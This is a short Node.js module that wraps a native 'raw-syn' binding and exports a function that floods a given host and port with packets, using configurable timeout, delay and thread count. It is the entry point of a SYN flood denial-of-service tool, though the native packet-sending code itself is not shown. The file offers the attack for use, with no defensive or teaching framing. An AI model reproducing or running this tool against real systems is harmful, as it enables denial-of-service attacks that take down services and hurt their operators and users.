const flood = require('bindings')('raw-syn');


module.exports = (host, port, timeout, delay, threads) => {
    flood.sendPacket(host, port, timeout, delay, threads);
};